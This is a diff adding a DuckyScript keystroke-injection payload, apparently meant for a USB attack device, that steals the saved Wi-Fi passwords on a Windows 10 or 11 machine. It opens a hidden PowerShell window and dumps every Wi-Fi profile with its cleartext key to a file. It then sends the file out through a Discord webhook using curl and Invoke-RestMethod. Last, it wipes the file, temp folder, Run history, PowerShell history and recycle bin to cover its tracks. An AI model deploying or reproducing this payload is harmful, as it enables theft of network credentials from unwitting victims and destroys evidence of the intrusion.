@@ -1,0 +1,47 @@
+REM Title: WiFi_Cred_Grab
+REM Author: LulzAnarchyAnon
+REM Description: A hidden powershell is opened, and the targets wifi credentials are saved to a txt file in C:\Users\Public\.
+REM Description: They are then exfiltrated uing a discord webhook. In the final stage of the payload the loot.txt file, the 
+REM recycling bin contents, the temp folder contents and powershell history are all deleted. 
+REM Description: REM This payload deployed, and was completed in a test run in 9.97 seconds
+REM Target: Windows 10 and 11
+REM Props: Darren Kitchen and I am Jakoby
+REM Version: 1.0
+REM Category: Exfiltration 
+
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -windowstyle hidden
+DELAY 200
+ENTER
+DELAY 500
+STRINGLN
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-File C:\Users\Public\loot.txt -Force -append
+function Upload-Discord {
+[CmdletBinding()]
+param (
+[parameter(Position=0,Mandatory=$False)]
+[string]$file,
+[parameter(Position=1,Mandatory=$False)]
+[string]$text 
+)
+$hookurl = 'YOUR DISCORD WEBHOOK HERE'
+$Body = @{
+'username' = $env:"YOUR DISCORD USERNAME HERE"
+'content' = $text
+}
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body |  ConvertTo-Json)};
+curl.exe -F "file1=@$file" $hookurl
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+Upload-Discord -file "C:\Users\Public\loot.txt"
+Remove-Item "C:\Users\Public\loot.txt"
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+exit
+END_STRINGLN
